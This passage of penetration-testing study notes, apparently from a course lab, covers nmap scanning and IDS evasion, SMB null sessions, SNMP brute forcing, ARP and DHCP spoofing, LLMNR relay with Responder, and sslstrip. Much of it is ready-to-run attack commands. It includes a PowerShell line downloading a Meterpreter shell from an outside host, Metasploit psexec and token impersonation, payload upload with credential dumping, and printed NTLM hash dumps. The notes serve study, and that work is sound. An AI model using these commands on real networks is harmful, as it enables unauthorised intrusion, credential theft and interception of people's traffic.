results to inspect later or import them into tools such as: \tDradis, Nessus, Faraday, Metasploit and so on.   The most used options:  -oN = The normal output will be stored into a file -oX = Creates a XML output that can be easily parsed by various tools -oG = Grepable output - deprecated. the output lists each host on one line. -oA &lt;file name&gt; = output in the three major formats at once.   There is also an advanced GUI called ZenMap = https://nmap.org/zenmap/      [+] info we can use the option –top-ports number = to scan the most popular ports       [+] info show detailed list of every packet sent and received with nmap by using –packet-trace option \thttps://nmap.org/book/man-output.html       [+] info TCP packet can be tagged with 6 different flags:    \tSynchronize - SYN \tFinish - FIN \tAcknowledgement - ACK \tPush - PSH \tReset - RST \tUrgent - URG         And we can set the bit of the flag we wanna nmap scan with –scanflags flag    Stealth mode - IDLE SCAN THEORY   -sI (Idle scan)  \tstealth technique that involves the presence of a zombie in the target network. \ta zombie is a host that is not sending or receiving any packets thus, the reason its called an idle scan. \tIP protocol implements a Fragmentation ID Header = https://tools.ietf.org/html/rfc791 and that many OS increase its value by 1 (For each packet).   info about fragmentation  Data must be encapsulated in order to be sent over the physical network link. In conjunction with this, the data has to be small enough to fit the format of the technology being used. the fragmentation process is basically, when data its too large it must be split into smaller messages. To the host be able to identify the fragments, its assigning a unique identifier to each fragment of the message called the *fragmentation ID*. This way the receiver knows the correct sequence of the fragments and can assemble them back into original message. by probing fragmentation IDs on the zombie, we can infer if a port is either open or closed on our target.      pre-requisites:            Find a zombie that assigns IP ID both incrementally and globally       Find an idle zombie, meaning that there should be no other traffic on the zombie that will disturb the IP ID.           How to find a good candidate zombie?   OS fingerprinting with nmap / nmap nse option   nmap will determine if the IP ID sequence generation is incremental (the one we need)      → nmap -O -v &lt;zombie ip&gt;  → nmap --script ipidseq &lt;zombie ip&gt; -p &lt;zombie port&gt;           nmap shows the result &gt; IP ID Sequence Generation is incremental, thus a good zombie   before the attack     Probe the zombies IP ID and record its value   Forge a SYN packet with the source address of the zombie and send it to the port of our target host  Depending on how the target reacts, it may or may not cause the zombie IP ID to be incremented.   Probe the zombies IP ID again and, pending upon the ID we can infer if the target port is open or closed   once we discover a zombie     Probe the zombies IP ID by sendind a SYN/ACK to it   Since the communication is not expected, the zombie will send back a RST with its IP ID   Forge a SYN packets (IP spoofing) with the zombie source IP address and send it to the target we wish to scan.   if the port is open     The target sends back a SYN/ACK to the zombie   The zombie does not expect it therefore, it sends a RST back to the target and increments its IP ID   The attacker probes again the zombies IP ID   The zombie sends back a RST. The attacker sees that the IP ID is incremented by 2 (from the initial probe)   if the port is closed     The target sends back to the zombie a RST and the zombie simply ignores the packet leaving its IP ID intact   The attacker probes again the zombies IP ID   The zombie send back a RST and the attacker sees that the IP ID is incremented by only 1.   idle scan - open door:      idle scan - close door:      Nmap NSE (Nmap Script Language)     NSE allow us to write/use shared scripts that help automate various tasks \tThe scripts are written in LUA programming language \tstored in /usr/share/nmap/scripts       Usage   \t-C or --script  --script-updatedb = to update nmap scripts --script-help \"smb*\" and discovery = search For specific script --script-help whois-domain    domain info  --script whois-domain &lt;ip&gt; -sn = to run the whois script   reconnaissance  --script smb-os-discovery = to run OS discovery   the same without NSE:  \t-O = force nmap to perform OS fingerprint scan \twe can see, that the results of nse are much better   smb shares  --script smb-enum-shares   - run all authentication scripts --script auth      it will save time, but can be noisy cause it will execute a lot of scripts    - OS, workgroup, NetBIOS --script default      Extra scanning tools   Multi Plataform (Linux, Mac, Windows):  - Angry IP Scanner - http://angryip.org/ - Masscan = https://github.com/robertdavidgraham/masscan   Only Windows:  - SuperScan = http://www.mcafee.com/us/downloads/free-tools/superscan.aspx   Service and OS Detection   Banner Grabbing     the message that the service, running on the targer host, sends back when another host tries to establish a connection to it.    tools:  \ttelnet, netcat, ncat  \tfollowed by &lt;ip&gt; &lt;port&gt;   Probing services  https://nmap.org/book/man-version-detection.html ``` nmap -sV &lt;options&gt; &lt;target ip&gt; ```   OS fingerprinting  https://nmap.org/book/man-os-detection.html   passive: \tidentifies the remote OS with packets that are received, without sending any packets. active:  \tsends packets and waits For a response \tNmap compares the results is obtains to its internal database of OS finferprints and, if there is a match, prints out the detected OS. \thttps://nmap.org/book/osdetect.html \thttp://phrack.org/issues/54/9.html#article  \tnmap -O -n &lt;target ip&gt; \t-A = enables OS detection, version detection, script scanning and traceroute. good, but very noisy. \t--osscan-guess = guest the OS more aggressively      There is a Passive option:   P0f = http://lcamtuf.coredump.cx/p0f3/   http://lcamtuf.coredump.cx/p0f3/README       ./p0f -i eth0           Firewall / IDS Evasion  two main issues: \tbecoming exposed \tobtaining incorrect results   Fragmentation  its the process of splitting a single packet into smaller ones this can disable the ability of some firewall and IDS systems to either apply their packet filtering rules or to process all the fragments. ``` nmap -sS -f &lt;target ip&gt; // -sS = SYN scan // -f = fragment packets // --mtu = specify a custom offset size. must be a multiple of eight  sudo nmap -f -sS -p 80,21,153,443 -Pn -n --disable-arp-ping  --data-length 100 = add 100 bytes to our payload -f -f = this cause the fragmented bytes to be 16 bytes instead 8 bytes ```   Decoys  add noise to the IDS by sending scans from spoofed IP addresses. As a result, a list of forged IPs (decoys) will appear on the IDS, along with the real attacker IP. This confuses the analysts watching the system, making it harder to identify the actual attacker.      All decoys are up and running (otherwise its easy to determine the real attackers IP)   The real IP address should appear in random order to the IDS (otherwise its easy to infer the real attacker IP)   ISPs traversed by spoofed traffic let the traffic go through   \tnmap -sS -D &lt;decoy ip#1&gt;,&lt;decoy ip#2&gt;,ME,&lt;decoy ip#3&gt; &lt;target ip &gt; \t// -D = decoy (no spaces after and before comas) \t-D RND:10  = 10 random decoys, even if they dont exist in the network  \thping3 --rand-source -S -p 80 &lt;target ip&gt; -c 3 \thping3 -a &lt;spoofed ip&gt; -S -p 80 &lt;target ip&gt; -c 3   Timing  slow down the scan in order to blend with other traffic in the logs of the Firewall/IDS you can define the interval between two scan probes, thus decreasing the chances to being noticed   \tnmap -sS -T[0-5] &lt;target ip&gt;  \t// -T0 - Paranoid - 5 min \t// -T1 - Sneaky   - 15 sec \t// -T2 - Polite      - 0,4 sec \t// -T3 - Normal   - default \t// -T4 - Aggressive - 10 millisec \t// -T5 - Insane    - 5 millisec   Source Ports  its used to abuse poorly configured firewalls that allow traffic coming from certain ports we can change our source port in order to bypass this restriction   \tnmap -sS --source-port 53 &lt;target ip&gt; \t// using -sS or -sU \t// --source-port &lt;port number&gt; // -g &lt;port number&gt;  \t// hping3 -S -s 53 -k -p 53 10.50.97.25 \t// -k = keep this port // -s = source port   Append random Data to the header payload  nmap  \t--data-length &lt;10&gt;   hping  \t--data &lt;10&gt;   Mac address spoofing  nmap  \t--spoof-mac apple/dell/etc = specify a vendor mac \t--spoof-mac 0 = specify a random mac \t--spoof-mac 00:11:22:33:44:55 = fixed mac   Random Host  nmap  \tmkdir host.list &gt; insert some hosts \t// -iL host.list (use host of file)  \t// --randomize-hosts (host sequence scan is random)   hping  \t--rand-dest 192.168.2.x \t-I &lt;interface&gt; \t-i u10 ( add 10 microseconds of delay between scans)      more information about bypassing firewall / IDS http://nmap.org/book/man-bypass-firewalls-ids.html    Enumeration   NetBIOS  The main purpose of NetBIOS is to allow application on different systems to communicate with one another over the LAN. its used For sharing printers and files, remote procedure calls, exchange messages and more. these features may reveal additional information such as computer names, usernames, domains, printers, shares   udp 137 - name services udp 138 - datagram services tcp 139 - session services   Name service:  works like a DNS record https://technet.microsoft.com/en-us/library/cc738412(v=ws.10).aspx   16 byte = characters &gt; 15 can be specified &gt; last 1 = resource type 00 to FF (hexa)   show the netbios names:  nbtstat -n   Windows Internet Name Service (WINS) - the service that maps netbios to ip address https://technet.microsoft.com/en-us/library/cc725802.aspx https://technet.microsoft.com/en-us/library/cc784180(v=ws.10).aspx https://technet.microsoft.com/en-us/library/cc784707(v=ws.10).aspx   Datagram service  NetBIOS Datagram Service (NBDS) permits the sending of messages to a NetBIOS name. datagram and broadcast methods  udp no error detection / correction      NetBIOS Session Service (NBSS) allows 2 names to establish a connection in order to exchange data.    SMB - Server Message Block  share files, disks, directories, printer, even COM ports across a network before windows 2000 SMB ran only with NetBIOS over TCP/IP port 139 After windows 2000, we can run SMB direcly over TCP, through port 445.   Nbtstat  windows:  \tnbtstat -A &lt;ip&gt; = gather information   linux:  \tnbtscan -v &lt;ip&gt; \tnmblookup -A &lt;ip&gt;   Net command  https://technet.microsoft.com/en-us/library/hh875576.aspx Net view allow us to list domains, computers and resources shared by a computer in the network. win:  net view &lt;ip&gt; net use K: \\\\&lt;ip&gt;\\C = it will map the C: driver   linux:   \tsmbclient -L &lt;ip&gt; \tsmbclient \\\\\\\\&lt;ip&gt;\\\\&lt;share&gt; \tsudo mount.cifs //&lt;ip&gt;/C /media/K_share/ user=,pass= \t      IPC$ = Inter-Process Communication - Can be used to leverage null session attacks    Null Session  Rely on Common Internet File System (CIFS) and Server Message Block (SMB) API, that return information even to an unauthenticated user. A malicious user can establish a connection to a Windows system without provinding any username or password. A connection must be established to the administrative share name IPC.   win:  net use \\\\&lt;ip&gt;\\IPC$ \"\" /u:\"\"   powershell (new-object System.Net.WebClient).DownloadFile('http://10.90.60.80:5923/shell_meterpreter.php','C:\\test.php')   Tools  win:  Winfingerprint = its GUI winfo &lt;ip&gt; -n  DumpSec &gt; report &gt; select computer &gt; target ip // report &gt; dump Users as column   linux:  \tenum4linux &lt;ip&gt; \t//mv polenum.py /usr/bin \t// install ldapscripts \t// -a = full scan  \trpcclient -N -U \"\" &lt;ip&gt; \t&gt; enumdomusers \t&gt; enumalsgroups \t&gt; srvinfo \t&gt; lookupnames \t&gt; queryuser \t&gt; enumprivs   sid2user.exe  sid2user.exe \\\\share &lt;sid&gt;   replace the - with spaces. sid can be found with Winfingerprint if you are in windows then we add  to see info about users 500 = administrator, 1000 = HelpAssistant      general tip: execute before starting metasploit    systemctl enable postgresql msfdb init   SNMP  Simple Network Management Protocol used For exchanging management information between network devices can also be used to configure a router or simply check its status   Commands  Read = monitor devices Write = configure devices and change device settings Trap = trap events from the device and report them back to the monitoring system Traversal Operations = determine what variables a certain device supports   Version  SNMPv1 = most vulnerable SNMPv3 = has encryption, but can be bruteforced   Type of Attacks     Flooding: DOS attack which involves spoofing an SNMP agent and floosing the SNMP trap management with tens of thousands of SNMP traps, varying in size from 50 bytes to 32 kilobytes, until the SNMP management trap is unable to function properly.   Community: Using Default community strings to gain privileged access to systems        Brute force: Using a tool to guess the community strings used on a system to achieve elevated privileges.       Obtaining the Community Strings Sniff the network traffic  dictionary attack  // even tho nowadays IDS will alert this activity as suspicious   Tools  SnmpWalk = http://www.net-snmp.org/docs/man/snmpwalk.html   snmpwalk -v 2c &lt;ip&gt; -c public -v = version -c = community string if the output returns the OID numerically: install snmp-mibs-downloader &gt;  then comment the fourth line /etc/snmp/snmp.conf #mibs : hrSWInstalledName hrMemorySize      more info: http://www.net-snmp.org/wiki/index.php/TUT:snmpwalk    SnmpSet = http://www.net-snmp.org/docs/man/snmpset.html the SET operation allows either the management application or, the manager, to set the value of an attribute (of a managed object) in the agent.   snmpwalk -v 2c -c public &lt;ip&gt; sysContact // SNMPv2-MIB::sysContact.0 = STRING: admin@els.com snmpset -v 2c -c public &lt;ip&gt; sysContact.0 s new@els.com // SNMPv2-MIB::sysContact.0 = STRING: new@els.com   SnmpEnum = http://dl.packetstormsecurity.net/UNIX/scanners/snmpenum.zip dos2unix *.txt   perl snmpenum.pl 10.10.10.5 public windows.txt   NMAP - SNMP Script  nmap -sU -p 161 --script=&lt;script&gt; &lt;target ip&gt;   useful scripts: /usr/share/nmap/scripts   snmp-brute snmp-info snmp-interfaces snmp-netstat snmp-processes snmp-sysdescr snmp-win32-services   --script snmp-brute = to find  the community strings   we can add: to use a better wordlist  --script-args snmp-brute.communitiesdb=&lt;wordlist&gt;   https://github.com/danielmiessler/SecLists   nmap -sU -p 161 --script snmp-win32-users 10.10.10.5 nmap -sU -p 161 --script snmp-* 10.10.10.5 -oG snmp.txt   Lab NetBios  my ip: 172.16.10.5   public ip &gt; 10.130.40.70 organization network: 172.30.111.0/24   msfconsole &gt; smb_login  bruteforce to get credential   ELS-WIN7 administrator:password   msfconsole &gt; psexec   \trun autoroute -s 172.30.111.0/24 \tctrl+z use auxiliary/scanner/portscan/tcp \tport 139,445 \tthreads 10 \trhost &lt;172.30.111.0/24&gt; \trun 172.30.111.10 &gt; 139,445 open      back to the meterpreter session use incognito list_tokens -u impersonate_token administrator background session    use smb_enumshares msf6 auxiliary(scanner/smb/smb_enumshares) &gt; run  [-] 172.30.111.10:139     - Login Failed: Unable to negotiate SMB1 with the remote host: Not a valid SMB packet [*] 172.30.111.10:445     - Windows XP Service Pack 3 (English) [+] 172.30.111.10:445     - My Documents - (DISK)  [+] 172.30.111.10:445     - IPC$ - (IPC) Remote IPC [+] 172.30.111.10:445     - C - (DISK)  [+] 172.30.111.10:445     - ADMIN$ - (DISK) Remote Admin [+] 172.30.111.10:445     - C$ - (DISK) Default share [+] 172.30.111.10:445     - FooComShare - (DISK)  [*] 172.30.111.10:        - Scanned 1 of 1 hosts (100% complete)   get back to shell  net use K: \\\\172.30.111.10\\FooComShare K: dir      background terminal   meterpreter &gt; download K:\\\\ Target -r      we now download the files from the share through another network This is more than prove that the network is vulnerable    Lab SNMP  internal pentest myip: 10.10.10.205   target network: 10.10.10.0/24   hosts:  10.10.10.5 \t161 - u //snmp runs in this port [161] \t\tpublic \t\tprivate 161/udp open  snmp |--script snmp-win32-users:  |   Administrator |   Guest |_  admin   10.10.10.20  \t139 - t \t445 - t \t137 - u \t1026 - u      After getting users from 10.10.10.5 we can try bruteforce // with nmap -sU -p161  --script snmp-brute but 10.10.10.5 does not have tcp ports opened,  so we can try to bruteforce 10.10.10.20 with the same users we found.    - we can run nmap -sU -p161 &lt;target&gt; snmp-* &gt; snmp_output      after getting the users in the snmp-win32-users we can bruteforce with hydra  then, msfconsole &gt; psexec set options &gt; run we have a session &gt; grab the flag &gt; its done       I tried with Hydra, it has error -.- running with metasploit, smb_login bruteforce its so slow… I hate to wait scans, my pc is weak.    anyway:  admin:a1b2c3d4      run psexec in metasploit with these credentials: we have authority\\system   meterpreter &gt; run hashdump   Administrator:500:0ffe87453383d68c695109ab020e401c:bcdbcc55cca6b509c5bf0c38757bb3eb::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: german:1002:aad3b435b51404eeaad3b435b51404ee:0a0f8ee7df8e26714d91e399a0a8fc33::: user04:1006:633c097a37b26c0caad3b435b51404ee:f2477a144dff4f216ab81f2ac3e3207d::: admin:1007:db170c426eae78beff17365faf1ffe89:482563f0adaac6ca60c960c0199559d2:::   Sniffing &amp; MitM Attacks   Overview  Passive Sniffing  watching packets on a network in order to gather sensitive information such as userids, passwords, and other sensitive information. you just need a sniffer, such as Wireshark.   Active Sniffing  performing malicious operations (MAC flooding or ARP poisoning) on the network. This means that we will inject packets on the network in order to redirect the traffic. Is not a stealthy technique   MAC Flooding  stress the switch and fill its CAM table A CAM table keeps all the info required to forward frames to the correct port:   &lt;MAC address - port number - TTL&gt;      When the space in the CAM is filled with fake MAC addresses, the switch cannot learn new MAC addresses. The only way to keep the network alive is to forward the frames meant to be delivered to the unknown MAC address on all the ports of the switch, thus making it fail open, or act like a hub.    ARP Poisoning (aka arp spoofing)  stealthiest among the active sniffing The attacker is able to redirect the traffic of the selected victims to a specific machine. Doing this will enable the attacker to not only monitor, but also modify the traffic. mainly mount a MitM attack, it can be used to DoS the network.   ARP Concepts  Address Resolution Protocol its supported by all NICs and OS. its a quick way to match Layer 3 network (IP address) with Layer 2 (MAC addresses)   Arp Protocol  ARP request ARP reply   ARP table &gt; stores the IP-MAC pairs and TTL value (time to live) related to each entry win:  arp -a   lin:  arp   Example  if a host-A need to send a packet to host-B, it will first check in his ARP table if it has the IP-MAC pair of host-B. if the entry is not found, an ARP request is sent on the LAN (broadcast). The request contains: source ip address: IP_A source mac address: MAC_A destination ip: IP_B destination mac: FF:FF:FF:FF:FF:FF   The nodes whose IP address does not match with the destination IP_B will just drop the packet The correspondent node will respond with ARP reply:   destination ip: IP_A destination mac: MAC_A source ip address: IP_B source mac address: MAC_B      After receiving the ARP reply, the arp table of host A will be updated For later use.       So ARP is used: a host wants to send a packet to another host in the same network a host desires to reach another host beyong his local network and needs the gateway hardware address a router needs to forward a packet For one host through another router a router needs to forward a packet to the destination host on the same network   Gratuitous ARP  its when a request are set with ip-mac, ip is the machine that is issuing the packet and the mac is the broadcast address and reply: that has been sent without being requested      Its useful to detect IP conflict or simply inform other hosts/switches of a MAC address in the network, an attacker can use these packets to mount ARP poisoning attacks.    2 main ways to ARP poisoning   Host Poisoning  create a MitM between hosts, forge Gratuitous ARP reply packets and send to both of the hosts All the traffic from B to A and from A to B will pass through the attacker. The attacker must be able to forward the packets quickly to keep the system administrator from suspecting anything   Gateway Poisoning  attacker will send Gratuitous ARP replys to some or all the hosts in a network, annoucing his MAC address as the MAc address of the default gateway For the network. Then the attacker can forward the packets to the real gateway. Unintentional DoS can occur in the network if the attacker is too slow forwading the packets   Sniffing Tools   Dsniff suite  http://www.monkey.org/~dugsong/dsniff/   collection of tools active/passive sniffing MITM attacks monitor the network For sensitive data      u can also feed dsniff with pcap (packet capture) from wireshark       the package also contains the following tools:                  Passive       Active       MITM                          FileSnarf       ArpSpoof       SshMITM                          MailSnarf       DnsSpoof       WebMITM                          MsgSnarf       Macof                                  URLSnarf                                          WebSpy                           WireShark  Select the interface capture options &gt; save file [ eth0_packet_capture_http ] select the filter &gt; tcp port http http.authbasic = list all the packets containing credentials sent to the application study packets we can right click and show packet in a new window look For the major heading names Hypertext Transfer Protocol open the child node named : **Authorization: Basic ** Here we can find the credentials used For the authentication   TcpDump     tcpdump is a powerfull tool, because we can use sideways with bash script scan and view with grep, and so on…    http://www.tcpdump.org/      tcpdump   ``` sudo tcpdump -i eth0 -xxAXXSs 0 dst  -dst = destination -A = print each packet in ASCII. good For web pages -XX = print the headers in hex and ASCII   xx = print headers in hex -S = print absolute, rather than relative, TCP sequence numbers -s = snarf bytes of data from each packet. adequate For IP, ICMP, TCP and UDP   sudo tcpdump -i eth0 -vvvASs 0 dst     &gt; we can also capture the authorization header with the credentials, but the difference is that wireshark automatically decodes the base64 text, tcpdump we will need to do this manually   sudo tcpdump -i eth0 host  sudo tcpdump -i eth0 src   dst  sudo tcpdump -i eth0 -F  sudo tcpdump -i eth0 -c  sudo tcpdump -i eth0 -w  sudo tcpdump -i eth0 -r       &gt; tcpdump For windows = https://www.winpcap.org/windump/   ## Main-in-The-Middle (MITM) Attacks  ### ARP Poisoning This attack leaves the MAC address of the attacker in the ARP cache of the victims Another gratuitous ARP with correct values would restore the correct values after the sniffing is completed. Countermeasures: using Static ARP is not a feasible approach into large and always changing networks. Tools like arpwatch or arpcop can detect not stop such attacks.  ### Local to Remote MITM When a host in a LAN wants to send packets to hosts outside the LAN it uses the default gateway The ARP poisoning in this scenario leads to a MITM attack from local to remote  ### DHCP Spoofing attacker can spoof the DHCP messages in order to mount a MITM attack.  1. A New host is connected to the network: it sends a DHCP Discovery broadcast packet using UDP on port 67. Since the host still needs an IP to be assigned, the source address of the packet is 0.0.0.0   → DHCPDISCOVER   src ip = 0.0.0.0 dst ip = 255.255.255.255 mac src = aaa mac dst = fff    → DHCPOFFER (the answer from dhcp server)   YIADDR = &lt; ip from dhcp &gt; // ‘Your IP Address’ Lease time = 3600 // in seconds - defines the validity period of the offered IP src ip = dhcp server ip dst ip = 255.255.255.255 // the destination is still a broadcast mac src = router mac mac dst = fff     → DHCPREQUEST (the client responds with another broadcast packet)   src ip = 0.0.0.0 // the source is still 0.0.0.0 since it has not received a verification from the server dst ip = 255.255.255.255 //still broadcast dhcp: request address =      → DHCPACK  YIADDR =  // the given ip src ip = dhcp ip  dst ip = 255.255.255.255 // broadcast  CHADDR = aaaa // client ethernet address = mac address    &gt; DHCP clients choose the best offer according to the lease time attribute in the DHCP offer: the longer the better. This packet is used to designate a winner between all the DHCP servers.    - What we have to do is send our DHCP OFFER with a greater lease time. This will lure the victim to choose our offer and then set the configurations we will send.  → DHCPOFFER (the answer from dhcp server)   YIADDR = &lt; ip from fake-dhcp &gt; // ‘Your IP Address’ Lease time = 10000 // in seconds - defines the validity period of the offered IP src ip = attacker dhcp server ip dst ip = 255.255.255.255 // the destination is still a broadcast mac src = rouge_mac mac dst = fff      &gt; DHCP servers not only offerIP addresses but they can also provide a default gateway For the network. By competing with legit DHCP servers (and winning by increasing the lease time), we can set ourselves as the default gateway.   ### MITM in Public Key Exchange - hijack the delivery of a public key into an asymmetric key encryption communication. - the asymmetric encryption is based on private/public key.  1. Alice queries the Key server For Bobs public key 2. The Key Server returns Bobs public key to Alice 3. Alice encrypts her message using Bobs public key and sends the message to Bob  &gt;  The MITM must be able to sniff traffic on Alices network or on the Key Server network (through ARP poisoning, DHCP snooping, etc)  #### Attack 1. Intercept Alices query and forward it to the Keys Servers 2. Intercept Bobs public key and store it For further use 3. Send his own Public Key to Alice instead of Bobs public key 4. Alice would encrypt data using Attacker Public Key thinking that she is using Bobs key 5. MITM would intercept Alices encrypted messages, decrypting them with his private key and then forward them to Bob using Bobs public key saved at step 2   ### LLMNR and NBT-NS Spoofing / Poisoning - LLMNR = Link-Local Multicast Name Resolution - NBT-NS = NetBIOS Name Service Effective methods For capturing users NTLMv1, NTLMv2 or LM (Lan Manager) hashes through MITM type of attack. LLMNR is the sucessor to NBT-NS and was instroduced in Windows Vista.  &gt; both allow machines within a Windows-based network to find one another and is essentially a **Fall-back** protocol used For the resolution of hostnames within a network when resolving of hostnames via DNS fails. the hashes are sent through the network, offering an attacker on the same network segment the opportunity to intercept.  ### A scenario of attacking LLMNR or NBT-NS 1. Host-A requests an SMB share at the system **\\\\intranet\\files**, but instead of typing **intranet** mistakenly types **intranet**. 2. Since **intranet** cant be resolved by DNS as it is an unkown host, Host-A then falls back to sending an LLMNR or NBT-NS broadcast message asking the LAn For the IP address For Host **Intrnet** 3. An attacker, (Host-B) responds to this broadcast message claiming to be the **intrnet** system 4. Host-A complies and sends Host-B (attacker) their username and NTLMv1 or v2 hash.  ### Responder / MultiRelay \thttps://github.com/lgandx/Responder \thttps://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py     → Responder works by listening For LLMNR or NBT-NS broadcast messages, and spoofing responses to targeted hosts, resulting in intercepting hashes we can either pass (relay) to other systems, or crack offline.    → MultiRelay will be responsible For relaying the hashes to other machines on the LAN and can provide us with a MultiRelay shell if successfull.  &gt; To this attack to work, 'SMB signing must be disabled' in the target. we can check with RunFinger.py (https://github.com/lgandx/Responder/blob/master/tools/RunFinger.py) which is included with Responder toolkit.  ```python \tpython RunFinger.py -i &lt;target ip&gt;   Attack  Modify the Responder.conf: disable the SMB and HTTP by setting the values to Off   Launch Responder.py:  python Responder.py -I eth0 --lm  -I = interface   Launch MultiRelay.py (in another tab):  python MultiRelay.py -t &lt;target ip&gt; -u ALL -u = user // -t =target      with the multiRelay shell we can upload files  upload /root/data/payload.exe = path of our file  C:\\windows\\temp\\payload.exe  = the file is save in this path       we can gain meterpreter shell  then load kiwi  creds_all    LLMNR / NBT-NS Poisoning      Attacking Tools   Ettercap  Ettercap is an open source program that combines a packet sniffer For differents protocols, but it also offers password cracking features.  sudo ettercap -G -G = graphical interface   select the sniffing option: \tUnified: it sniffs all the packets on the cable \tBridged: it uses two network interfaces and forwards the traffic from one to the other select the interface: \ttap0 in this case   The first step: \tfind alive hosts \tHosts &gt; Scan For Hosts \tHere we can select which of the hosts gonna be our targets \tclick Add to Target 1 and Add to Target 2      Supposing we want to intercept only the traffic of a specific host, we will add the target host and the router in the list. example: \tAdd to target 1 : 172.16.5.15 // host \tAdd to target 2 : 172.16.5.1   // route            If you do not select a target, ettercap will automatically set ANY (all the hosts) in the target list. be aware, this will force your machine to handle a great amount of traffic, it can cause DoS to your network.            Once we set the targets, we can select the type of attack to run:   ARP poisoning   ICMP redirect   Port Stealing   DHCP spoofing            Lets go with ARP poisoning &gt; Sniff remote connections   The ARP attack automatically starts, and we should now be able to intercept the traffic of our target machine.   Lets first check our (the attacker) MAC address   now check the ARP table of the target machine: arp -a / arp   if the gateway has our MAC address, it means that the attack is working          Now that we know that the attack is working, check: View &gt; Connections In order to inspect the traffic intercepted. we can view the packets, just double click on a connection listed in the previous view. Moreover, Ettercap automatically tried to intercept credentials sent via the network.       With the current configuration we can use other sniffing tools at the same time. For example, we can start Wireshark to sniff the tap0 traffic. Until now we can read the traffic, because is (HTTP, FTP) not encrypted.   Cain &amp; Abel  https://web.archive.org/web/20190101122212/http:/www.oxid.it/cain.html   Sniffer &gt; Start/Stop sniffer icon &gt; Scan MAC address After the scanning go to the APR tab = ARP poisoning attack click in the top of white box &gt; click on the blue plus icon in the top menu select the route 172.16.5.1 and the host 172.16.5.15 click in the nuclear symbol in the top menu to start.      the word poisoning should appear in the Status column if the attack is working, we will start seeing packets in the bottom section of the windows.       go to the tab password, to show the credentials Cain grabbed.   we can send to cracker right clicking on the line that contains the password   after getting the passwords go to the network tab, add the IPs and try to log then go to services &gt; install abel refresh the network machine, Abel should appear now we can control the console and get more hashes if needed   Macof  The CAM (Content Addressable Memory) table allows a switch to route packets from one host to another, but it has a limited memory For this function. This table maps MAC addresses to the physical ports on the switch. MAC flooding makes use of this limitation of memory of the CAM table. It will flood the switch with fake MAC addresses, until the switch cannot keep up.      This causes the switch to enter in Failopen Mode, wherein the switch begins acting as a network Hub by broadcasting packets to all the machines on the network. Usually takes 70 sec to fill the CAM table with Macof, it generates 155.000 MAC entried per minute.    usage  macof -s -d -e -x -y -i -n -i = interface -s = source ip address -d = destination ip address -e = target hardware address -x = tcp source port -y = tcp destination port -n = numbers of packets to send       make sure ip forwarding is active on the attacking machine: \techo 1 &gt; /proc/sys/net/ipv4/ip_forward    sudo macof -i tap0  then we can start a network sniffer if u are not seeing data from other systems, probably the router or switch has protection against MAC flood  sudo macof -i tap0 -n 32   Arpspoof  sudo arpspoof -i tap0 -t &lt;target ip&gt; -r &lt;router/gateway ip&gt;   example = -t 172.16.5.15 -r 172.16.5.1      this command is a ARP reply to the victim 172.16.5.15 and is telling that the MAc address of the host 172.16.5.1 (gateway) is our MAC address, we can go the target machine and check the arp table // arp -a now we send the same command but with the addresses reversed, because we need to send to the gateway, that the address from the target machine is our MAC.    sudo arpspoof -i tap0 -t &lt;gateway ip&gt; &lt;target ip&gt; sudo arpspoof -i tap0 -t 172.16.5.1 -r 172.16.5.15      now the attack is complete, we can sniff the network with wireshark or tcpdump    dsniff -i tap0      make sure ip forwarding is active on the attacking machine: \techo 1 &gt; /proc/sys/net/ipv4/ip_forward    Bettercap  http://www.bettercap.org/   Find the targets:  bettercap -I tap0 --no-spoofing   Set the target and gateway:  bettercap -I tap0 -G 172.165.5.1 -T 172.16.5.15 -X -P \"HTTPAUTH,URL,FTP,POST\" -G = gateway // -T = target ip // -X = sniffer // -P = parser, we can use \"*\" if we wanna enable all parsers   Intercepting SSL traffic      What we need to do is to instruct Ettercap to create and use a fake SSL certificate that will be sent to the victim machine every time it tries to establish HTTPS connections. If the victim user accepts the certificate, Ettercap will be then able to decrypt the traffic.   Edit this file: /etc/ettercap/etter.conf  [privs] ec_uid = 0 ec_gid = 0      uncomment the following lines &gt; redir_command_on/off       Now we are able to intercept and read some of the HTTPS traffic too.    Sslstrip     https://github.com/moxie0/sslstrip   How it works  Performs a MITM attack on the HTTPS connection between the victim and the server Replaces the HTTPS links with HTTP clone links and remembers the links which were changed Communicates with the victim client over HTTP connections For any secure link Communicates with the legitimate server over HTTPS For the same secure link The Sslstrip attacker machine transparently proxies the communications between the victim and the server Favicon images are replaced with the known secure lock icon to provide familiar visual confirmations Ssslstrip logs all traffic passing through so passwords, credentials etc are stolen without the victim knowning   Some issues  Some content encoding, such as gzip is difficult to parse Cookies that are sent over HTTPS will not be sent over HTTP that has striped the SSL Any cached pages which did not have the links swapped out   Counter the issues  Stopping the secure bit on the Set-Cookie statements on the pages Strip the difficult encodings from the client requests Strip the if-modified-since headers to eliminate the cached pages being requested.   Preparation     enable the ip forwarding:   echo 1 &gt; /proc/sys/net/ipv4/ip_forward   set up port redirection using iptables:   iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-ports 8080   Start sslstrip      We r gonna instruct it to listen on port 8080. // -w = save logs // -f = substitute the favicon on secure req    sslstrip -a -f -l 8080 -w els_ssl   Ettercap  last step is to configure Ettercap in order to mount an ARP MITM attack between victim and gateway. // we can move into the victim machine and execute a secure web session. As we can see, the URL contain HTTP and the favicon has been substituted with a lock icon. // as soon as we try to log into the portal, Ettercap will display the request and the credentials sent by the victim.       [+] Similarly, we can use others tools in conjunction with ssltrip. Bettercap already implements sslstrip with –proxy-https    bettercap -G 172.168.102.2 -T 192.168.102.135 --proxy-https   HSTS  From this moment on, if the victim tries to open an HTTPS link, it will be automatically stripped down to HTTP Does not work in all website tho, and newer browsers because the HSTS (HTTP Strict Transport Security) policy mechanism is in place. HSTS is a security enhancement specified by the web application and that prevents the protocol downgrade from HTTPS to HTTP.   preload lists  This attack works fine if the victim tried the connection to the web site For the first time. This happens because the web browser does not know whether or not to use a secure connection, since it never received the HSTS header. In order to defeat this issue, web browser implemented the so called ‘preload lists’, which contain sites that have to be accesses with a secure connection, even if its the first time.   resources about HSTS  https://src.chromium.org/viewvc/chrome/trunk/src/net/http/transport_security_state_static.json https://blog.mozilla.org/security/2012/11/01/preloading-hsts/ https://src.chromium.org/viewvc/chrome/trunk/src/net/http/transport_security_state_static.json https://support.microsoft.com/en-us/kb/3071338   HSTS Bypass  https://github.com/singe/sslstrip2 https://github.com/byt3bl33d3r/MITMf   Attack Summary     The victim goes to google.com (not in the HSTS preload list)   We (attacker) intercept the 